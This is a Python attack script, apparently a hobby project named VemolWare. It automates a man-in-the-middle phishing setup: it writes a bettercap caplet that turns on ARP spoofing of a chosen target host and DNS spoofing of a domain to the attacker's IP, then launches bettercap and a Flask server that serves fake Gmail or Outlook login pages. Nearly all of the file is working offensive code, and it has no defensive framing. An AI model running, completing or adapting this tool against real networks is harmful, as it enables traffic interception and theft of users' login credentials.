import os
import sys
import logging
import subprocess
import socket
import netifaces
import json
from optparse import OptionParser

# import subprocess
# >>> result = subprocess.run(['ls', '-l'], stdout=subprocess.PIPE)
# >>> result.stdout
# os.system('gnome-terminal -- ping 8.8.8.8')

DOMAIN_TARGET = {
    '1': 'gmail-login.html',
    '2': 'outlook-login.html',
}

LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr'] 

class VemolWare:
    def __init__(self):

        # if os.geteuid() != 0:
        #     print ("[-] Run me as root")
        #     sys.exit(1)

        # ------------ Main ------------
        usage = 'Usage: %prog [-i interface] [-t target] host'
        parser = OptionParser(usage)
        parser.add_option('-i', dest='interface', help='Specify the interface to use')
        parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
        parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
        (self.options, self.args) = parser.parse_args()
        # Check interface input is given
        if self.options.interface == None:
            parser.print_help()
            sys.exit(0)

        # Select target domain
        try:
            print("\nEnter the domain:")
            print("[1] - Gmail.")
            print("[2] - Outlook.")
            print("[3] - Other.\n\n")
            self.option_domain = input("Selected option: ")
            self.option_domain = DOMAIN_TARGET.get(self.option_domain, '')
            if self.option_domain == 3:
                new_domain = input("\n\nEnter your domain: ")
                # TODO: wget para el domain
        except ValueError:
            print("Sorry, I didn't understand that.")
            sys.exit(0)

    def create_config_file_json(self):
        data = {
            'local_ip': netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr'],
            'target': self.options.target,
            'domain': self.option_domain
        }
        with open('config_w.json', 'w') as f:
            json.dump(data, f)
        f.close()
    
    def create_config_file_bettercap(self):
        data = json.load(open('config_w.json'))
        file = open('config_bettercap.txt','w') 
        file.write(f'set arp.spoof.targets {self.options.target}\n')
        file.write('arp.spoof on\n')
        file.write(f'set dns.spoof.address {LOCAL_IP}\n')
        file.write('set dns.spoof.domains www.vemol2.com\n')
        file.write('dns.spoof on\n')
        file.close()

    def check_requirements(self):
        pass
        # os.system('gnome-terminal -- ping 8.8.8.8')

    def arpspoof(self):
        # Setiting up Arpspoof
        gws = netifaces.gateways()
        target = gws['default'][netifaces.AF_INET][0]
        command = f'gnome-terminal -- bettercap --caplet config_bettercap.txt'
        os.system(command)
    
    def dnssniff (self):
        # Setting up Dnsspoof
        # TODO: copiar el hosts a hosts_bak y meter en hosts ip -- 
        command = f'gnome-terminal -- dnsspoof -i eth0 -f /etc/hosts'
        os.system(command)
    
    def flask_server (self):
        # Starting Flask server targeting domain address
        command = f'gnome-terminal -- python3 app.py {self.option_domain}'
        os.system(command)
    
    def main(self):
        self.create_config_file_bettercap()
        self.arpspoof()
        #self.dnssniff()
        self.flask_server()


if __name__ == "__main__":
    vemol_ware = VemolWare()
    vemol_ware.main()
	# arpspoof.main()



